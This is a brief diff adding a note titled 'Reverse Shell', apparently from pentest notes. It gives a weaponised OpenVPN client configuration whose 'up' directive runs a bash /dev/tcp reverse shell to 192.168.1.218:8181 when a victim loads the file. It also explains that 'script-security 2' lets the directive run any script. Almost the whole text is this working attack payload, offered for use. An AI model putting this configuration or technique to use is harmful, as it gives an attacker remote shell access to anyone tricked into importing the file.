@@ -1,0 +1,8 @@
+* Reverse Shell
+  remote 192.168.1.245
+  ifconfig 10.200.0.2 10.200.0.1
+  dev tun
+  script-security 2
+  up “/bin/bash -c ‘/bin/bash -i > /dev/tcp/192.168.1.218/8181 0<&1 2>&1&’”
+    * This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1).
+    * Basically, the up command will execute any binary of script you point it to . If the victim is using a version of Bash that supports /dev/tcp then getting a reverse shell is trivial. The following ovpn file will background a reverse shell to 192.168.1.218:8181.
